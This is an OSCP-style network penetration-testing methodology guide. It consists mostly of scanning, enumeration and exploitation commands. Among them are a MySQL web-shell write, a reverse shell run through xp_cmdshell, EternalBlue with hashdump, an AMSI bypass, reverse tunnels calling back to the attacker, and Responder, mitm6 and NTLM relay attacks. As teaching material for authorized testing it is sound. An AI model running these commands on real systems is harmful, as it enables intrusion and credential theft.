---
id: "02"
title: "Network PT Methodology"
tags: ["network","linux","windows"]
---
# 02 — Network Penetration Testing Methodology

> **Description:** Internal and external network PT — host discovery to root.
> **Best For:** Internal network engagements, lab environments with multiple hosts, OSCP-style multi-machine scenarios.
> **Strength:** Full protocol coverage with exact enumeration commands, exploitation examples, and documentation steps.

---

## Decision Tree: External Access Only → What First?

> The most common start: a target IP or a range in scope and nothing else in hand. Work it in this order and never skip the enumeration.

```
Unauthenticated, external only, no creds yet →

  STEP 1: Host Discovery (find every live host on the range)
      ↓
  STEP 2: Full Nmap Strategy (every open port, with service and version)
      ↓
  STEP 3: Service Enumeration Deep Dive (dig each service for the way in)
      → any anonymous access, default creds, or exposed admin panel?
      ↓
  STEP 4: Vulnerability Research Workflow (map the versions to known CVEs)
      ↓
  STEP 5: Exploitation Examples (turn the best finding into a foothold)
```

---

## 1. Host Discovery

### External (Single Target Known)

```bash
# Verify the target is alive
ping -c 4 <TARGET-IP>
nmap -sn <TARGET-IP>
```

### Internal Network Discovery

```bash
# ARP scan — most reliable on local /24 (Layer 2, bypasses host firewall)
arp-scan -l                          # Scan local network
arp-scan --interface=eth0 <RANGE>

# Nmap ping sweep
nmap -sn <RANGE> -oA scans/host_discovery
nmap -sn 192.168.1.0/24 --exclude <YOUR-IP>

# netdiscover (passive + active ARP)
netdiscover -r <RANGE> -i eth0
netdiscover -p            # Passive mode only — just listen

# fping — fast ICMP sweep
fping -a -g <RANGE> 2>/dev/null

# masscan — fastest port scanner for large ranges
masscan -p80,443,445,22 <RANGE> --rate=1000 -oL scans/masscan_results.txt
```

---

## 2. Full Nmap Strategy

### Scan Order

```bash
# Phase 1: Quick common ports — immediate results
nmap -sC -sV -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,512,513,514,\
587,631,873,993,995,1433,1521,2049,3306,3389,5432,5900,5985,5986,6379,8080,\
8443,8888,9090,27017 <TARGET-IP> -oA scans/quick

# Phase 2: Full TCP — all 65535 ports
nmap -p- --min-rate 5000 -T4 <TARGET-IP> -oA scans/full_tcp

# Phase 3: Targeted — run scripts on all discovered ports
nmap -sC -sV -p <DISCOVERED-PORTS> <TARGET-IP> -oA scans/targeted

# Phase 4: UDP top-200 (don't skip this)
nmap -sU --top-ports 200 --min-rate 2000 <TARGET-IP> -oA scans/udp

# OS detection
nmap -O <TARGET-IP> --osscan-guess
```

### Output Reading

```bash
# Quick summary of open ports from xml output
grep "portid" scans/full_tcp.xml | grep "open"

# Convert nmap xml to HTML for easier reading
xsltproc scans/full_tcp.xml -o scans/full_tcp.html
```

### Nmap NSE Scripts by Category

```bash
# Vulnerability scanning
nmap --script vuln <TARGET-IP>

# Default scripts (safe, informational)
nmap -sC <TARGET-IP>

# Auth brute (careful with lockout)
nmap --script brute <TARGET-IP>

# Full discovery
nmap --script discovery <TARGET-IP>

# Specific vulnerability checks
nmap --script smb-vuln-ms17-010 -p 445 <TARGET-IP>
nmap --script http-shellshock -p 80 <TARGET-IP>
```

---

## 3. Service Enumeration Deep Dive

### FTP — Port 21

```bash
# Step 1: Check anonymous login
ftp <TARGET-IP>
# Username: anonymous   Password: anonymous (or blank)

# Step 2: Nmap FTP scripts
nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 <TARGET-IP>

# Step 3: Navigate and retrieve files
ftp> ls -la
ftp> cd /path
ftp> binary          # Switch to binary mode before downloading
ftp> get filename
ftp> mget *          # Get everything
ftp> prompt off      # Disable download prompts

# Step 4: Upload (check if write access exists)
ftp> put /local/file.php

# vsftpd 2.3.4 — classic backdoor
searchsploit vsftpd 2.3.4
# Metasploit: use exploit/unix/ftp/vsftpd_234_backdoor
```

---

### SSH — Port 22

```bash
# Step 1: Banner grab + version
ssh -v <TARGET-IP> 2>&1 | head -20
nc -nv <TARGET-IP> 22

# Step 2: Check for weak keys
nmap --script ssh-hostkey,ssh-auth-methods -p 22 <TARGET-IP>

# Step 3: Username enumeration (OpenSSH < 7.7)
searchsploit openssh user enumeration
python3 /usr/share/exploitdb/exploits/linux/remote/45939.py <TARGET-IP> root

# Step 4: Use found credentials / keys
ssh <USER>@<TARGET-IP>
ssh -i /path/to/id_rsa <USER>@<TARGET-IP>
chmod 600 id_rsa && ssh -i id_rsa <USER>@<TARGET-IP>

# Step 5: Crack SSH private key passphrase
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

---

### HTTP/HTTPS — Ports 80, 443, 8080, 8443

```bash
# Step 1: Tech fingerprint
whatweb http://<TARGET-IP> -a 3
curl -IL http://<TARGET-IP>
nikto -h http://<TARGET-IP> -o scans/nikto.txt

# Step 2: Directory enumeration
gobuster dir -u http://<TARGET-IP> \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,old,zip,sql \
  -o scans/gobuster_med.txt \
  -t 50

# Step 3: Check standard files
curl http://<TARGET-IP>/robots.txt
curl http://<TARGET-IP>/.htaccess
curl http://<TARGET-IP>/.git/HEAD
curl http://<TARGET-IP>/sitemap.xml
curl http://<TARGET-IP>/crossdomain.xml

# Step 4: Virtual host discovery
gobuster vhost -u http://<TARGET-IP> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Step 5: Manual exploration with Burp Suite proxy
# Set browser proxy to 127.0.0.1:8080, browse all functionality
```

→ **Full web methodology in [Web Application PT](/technique/web-application-pt/)**

---

### SMB — Ports 139, 445

```bash
# Step 1: Null session share enum
smbclient -L //<TARGET-IP> -N
enum4linux-ng -A <TARGET-IP> | tee scans/enum4linux.txt

# Step 2: CrackMapExec recon
crackmapexec smb <TARGET-IP>
crackmapexec smb <TARGET-IP> -u '' -p '' --shares
crackmapexec smb <TARGET-IP> -u 'guest' -p '' --shares

# Step 3: Connect and browse shares
smbclient //<TARGET-IP>/<SHARE> -N
smbclient //<TARGET-IP>/<SHARE> -U <USER>%<PASS>

# Step 4: Recursive download
smbclient //<TARGET-IP>/<SHARE> -N -c "recurse on; prompt off; mget *"

# Step 5: Check for MS17-010 (EternalBlue)
nmap --script smb-vuln-ms17-010 -p 445 <TARGET-IP>

# Step 6: EternalBlue exploit
# Metasploit:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET-IP>
set LHOST <YOUR-IP>
run

# Manual (zzz_exploit.py from GitHub):
python3 zzz_exploit.py <TARGET-IP>
```

---

### SNMP — Port 161 (UDP)

```bash
# Step 1: Community string brute force
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET-IP>
hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
  -o scans/snmp_brute.txt snmp://<TARGET-IP>

# Step 2: Full SNMP walk
snmpwalk -c public -v2c <TARGET-IP> | tee scans/snmpwalk.txt
snmp-check <TARGET-IP> -c public | tee scans/snmpcheck.txt

# Step 3: Target useful MIBs
snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.4.1.77.1.2.25    # Windows users
snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.2.1.25.4.2.1.2   # Running processes
snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.2.1.6.13.1.3     # TCP ports
snmpwalk -c public -v1 <TARGET-IP> 1.3.6.1.2.1.25.6.3.1.2   # Installed software

# Step 4: Look for credentials in process list and software names
grep -i "pass\|cred\|user\|key\|secret\|token" scans/snmpwalk.txt
```

---

### NFS — Ports 111, 2049

```bash
# Step 1: Enumerate available mounts
showmount -e <TARGET-IP>
nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 <TARGET-IP>

# Step 2: Mount the share
mkdir /mnt/nfs
mount -t nfs <TARGET-IP>:/exported/path /mnt/nfs -nolock -o vers=3
ls -la /mnt/nfs

# Step 3: Check for no_root_squash
# If /etc/exports on target shows no_root_squash, you can plant a SUID binary as root
# Full no_root_squash exploitation is covered in Linux PrivEsc

# Step 4: Look for interesting files
find /mnt/nfs -type f 2>/dev/null
find /mnt/nfs -name "*.conf" -o -name "*.txt" -o -name "*.key" 2>/dev/null

# Cleanup
umount /mnt/nfs
```

---

### MySQL — Port 3306

```bash
# Step 1: Attempt login
mysql -h <TARGET-IP> -u root -p
mysql -h <TARGET-IP> -u root --password=""
mysql -h <TARGET-IP> -u "" --password=""

# Step 2: Nmap MySQL scripts
nmap --script mysql-empty-password,mysql-info,mysql-databases,mysql-users -p 3306 <TARGET-IP>

# Step 3: Database enumeration
SHOW DATABASES;
USE <db>;
SHOW TABLES;
DESCRIBE <table>;
SELECT * FROM <table> LIMIT 10;
SELECT user, password, authentication_string FROM mysql.user;

# Step 4: RCE via file write (requires FILE privilege)
SHOW VARIABLES LIKE 'secure_file_priv';    # Must be empty/NULL for write to work
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/cmd.php';
SELECT LOAD_FILE('/etc/passwd');
```

---

### MSSQL — Port 1433

```bash
# Step 1: Connect
impacket-mssqlclient <USER>:<PASS>@<TARGET-IP>
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET-IP> -windows-auth

# Step 2: Nmap enumeration
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info -p 1433 <TARGET-IP>

# Step 3: Basic queries
SELECT @@version;
SELECT name FROM master..sysdatabases;
USE <db>; SELECT * FROM INFORMATION_SCHEMA.TABLES;

# Step 4: Enable and use xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';

# Step 5: Reverse shell via xp_cmdshell
EXEC xp_cmdshell 'powershell -e <BASE64-ENCODED-REVSHELL>';
```

---

### RDP — Port 3389

```bash
# Step 1: Check + gather info
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 <TARGET-IP>

# Step 2: Connect with creds
xfreerdp /u:<USER> /p:<PASS> /v:<TARGET-IP> /cert:ignore +clipboard /dynamic-resolution

# Step 3: Enable RDP from existing shell (Windows target)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
```

---

### WinRM — Ports 5985 / 5986

```bash
# Step 1: Verify WinRM is accessible
crackmapexec winrm <TARGET-IP> -u <USER> -p <PASS>
nmap -p 5985,5986 <TARGET-IP>

# Step 2: Connect with evil-winrm
evil-winrm -i <TARGET-IP> -u <USER> -p <PASS>
evil-winrm -i <TARGET-IP> -u <USER> -H <NTLM-HASH>

# Step 3: Useful evil-winrm features
upload /kali/path/winpeas.exe
download C:\Users\user\proof.txt
menu              # Shows available commands: Bypass-4MSI, Invoke-Binary, etc.
Bypass-4MSI       # AMSI bypass
```

---

## 4. Vulnerability Research Workflow

```bash
# Step 1: Identify exact version from enumeration
# Example: "Apache 2.4.49"

# Step 2: searchsploit
searchsploit apache 2.4.49
searchsploit -x 50383    # Read the exploit code directly
searchsploit -m 50383    # Copy exploit to current directory

# Step 3: Google dork
# site:exploit-db.com "apache 2.4.49"
# site:exploit-db.com "vsftpd 2.3.4"
# "service version" github poc
# CVE-XXXX-XXXXX proof of concept

# Step 4: Check NVD for CVE details
# https://nvd.nist.gov/vuln/search?query=apache+2.4.49

# Step 5: GitHub for PoC
# https://github.com/search?q=CVE-XXXX-XXXXX
# https://github.com/trickest/cve

# Step 6: Check HackTricks for the service
# https://book.hacktricks.xyz/network-services-pentesting/
```

---

## 5. Exploitation Examples

### Python Exploit (Manual)

```bash
# Copy and modify
searchsploit -m 50383
cat 50383.py        # Read it. Understand every argument.
python3 50383.py    # Check usage
python3 50383.py <TARGET-IP> <PORT> /bin/bash
```

### Metasploit Framework

```bash
msfconsole -q

# Find the module
search <service>
search type:exploit platform:windows smb
search cve:2021-34527

# Use and configure
use exploit/windows/smb/ms17_010_eternalblue
info               # Read description, targets, options
show options
set RHOSTS <TARGET-IP>
set LHOST <YOUR-IP>
set LPORT 4444

# Verify before running
check

# Run
run

# If successful — useful Meterpreter commands
sysinfo
getuid
getsystem        # PrivEsc attempt
hashdump         # Dump password hashes
shell            # Drop to system shell
upload /kali/file.exe C:\\Windows\\Temp\\
download C:\\Users\\Administrator\\Desktop\\proof.txt
run post/multi/recon/local_exploit_suggester
```

### Manual Python Reverse Shell Exploit Pattern

```python
import socket

TARGET = "<TARGET-IP>"
PORT = <TARGET-PORT>
PAYLOAD = b"<EXPLOIT-BYTES>"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))
s.send(PAYLOAD)
print(s.recv(1024).decode())
s.close()
```

---

## 6. PrivEsc Summary (Pointers)

After getting a shell, route by where you landed:

- Shell on **Linux** → [Linux PrivEsc Methodology](/technique/linux-privesc/)
- Shell on **Windows** → [Windows PrivEsc & Post-Exploitation](/technique/windows-privesc-post-exploitation/)
- Shell on **domain-joined Windows** → [Active Directory Methodology](/technique/active-directory/) first

**Quick triage:**
```bash
# Linux: first 5 commands after getting shell
id && whoami
sudo -l
find / -perm -4000 2>/dev/null | sort     # SUID
cat /etc/crontab && ls /etc/cron*
uname -a && cat /etc/os-release

# Windows: first 5 commands after getting shell
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic service get name,startname,pathname | findstr /i /v "C:\\Windows"
schtasks /query /fo LIST /v | findstr "Task To Run"
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## 7. Proof Capture & Documentation

### Linux (low-priv proof)

```bash
# Capture proof before doing anything else
hostname && id && ifconfig && cat /home/*/local.txt 2>/dev/null
```

### Linux (root proof)

```bash
hostname && id && ifconfig && cat /root/proof.txt
```

### Windows (user proof)

```powershell
hostname && whoami && ipconfig && type C:\Users\<USER>\Desktop\local.txt
```

### Windows (Administrator/SYSTEM proof)

```powershell
hostname && whoami && ipconfig && type C:\Users\Administrator\Desktop\proof.txt
```

### Screenshot Checklist

| Item | Command |
| --- | --- |
| Proof file contents | `cat /root/proof.txt` or `type proof.txt` |
| Current user + privileges | `id` or `whoami /all` |
| Hostname | `hostname` |
| IP address | `ip a` or `ipconfig` |
| Initial exploitation command | Screenshot your shell coming back |

### Documentation Template Per Machine

```
TARGET: <IP>
OS: <detected>
OPEN PORTS: <list>
INITIAL FOOTHOLD: <service> via <vuln/method>
PRIVESC: <method used>
PROOF: <hash or content>
CREDS FOUND: <user:pass>
NOTES: <anything unusual>
```

---

## 8. Pivoting & Tunneling

**What it is:** A foothold is a doorway, not the destination. Pivoting routes your tools through the compromised host so you can scan and attack the internal segments behind it. Master one SSH trick, one modern tunneler (Ligolo-ng or Chisel), and proxychains, and no subnet stays out of reach.

```bash
# SSH dynamic forward: a SOCKS proxy through the target (the workhorse)
ssh -D 1080 -N <USER>@<TARGET-IP>
# Point proxychains at it (/etc/proxychains4.conf -> socks5 127.0.0.1 1080), then:
proxychains nmap -sT -Pn <INTERNAL-IP>
```

```bash
# SSH local forward: pull one internal service to your box
ssh -L 3306:<INTERNAL-IP>:3306 -N <USER>@<TARGET-IP>

# SSH remote forward: push your service to the target when it cannot reach you
ssh -R 8000:localhost:8000 -N <USER>@<TARGET-IP>

# sshuttle: a VPN over SSH, routes a whole subnet with no proxychains
sshuttle -r <USER>@<TARGET-IP> <RANGE>
```

```bash
# Chisel: SOCKS over HTTP when you only have a web foothold and no SSH
chisel server -p <LPORT> --reverse
./chisel client <YOUR-IP>:<LPORT> R:socks
```

```bash
# Ligolo-ng: the modern favorite, a real tun interface (no proxychains)
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert
# On the victim, connect the agent back to you:
./agent -connect <YOUR-IP>:11601 -ignore-cert
# In the ligolo console: session, then add a route for <RANGE> to the ligolo interface
```

**Most reliable path:** SSH dynamic forward + proxychains for a quick SOCKS, or Ligolo-ng when you want a real interface. Both let BloodHound, netexec, and nmap reach the internal network as if you were sitting on it.

---

## 9. Network Poisoning & MITM

**What it is:** On an internal network you do not always need credentials to begin; you can make the network hand them to you. Poison name resolution (LLMNR / NBT-NS / mDNS) or take over IPv6 DNS and Windows machines authenticate to you. Capture the NetNTLM hashes to crack offline, or relay them straight into a live session.

```bash
# Responder: poison LLMNR / NBT-NS / mDNS and capture NetNTLM hashes
sudo responder -I <INTERFACE>
# Analyze mode first (listen, do not poison) to stay safe on a client engagement:
sudo responder -I <INTERFACE> -A
# Captured hashes save to /usr/share/responder/logs -> crack with: hashcat -m 5600
```

```bash
# mitm6: take over IPv6 DNS (Windows prefers IPv6) and funnel it to your relay
sudo mitm6 -d <DOMAIN>
# Pair with ntlmrelayx to relay the coerced auth into LDAP or SMB
impacket-ntlmrelayx -6 -t ldaps://<DC-IP> -wh wpad.<DOMAIN> --delegate-access
```

```bash
# ARP spoof MITM with bettercap: sit between a target and the gateway, then sniff
sudo bettercap -iface <INTERFACE>
# In bettercap: set arp.spoof.targets <TARGET-IP>; arp.spoof on; net.sniff on
```

**Most common exploit path:** Responder or mitm6 captures a NetNTLM hash within minutes on most internal networks → crack it, or relay it with ntlmrelayx to land a session without ever cracking. The usual unauthenticated start of an internal engagement (see the AD Attack Path and NTLM Relay & Coercion).
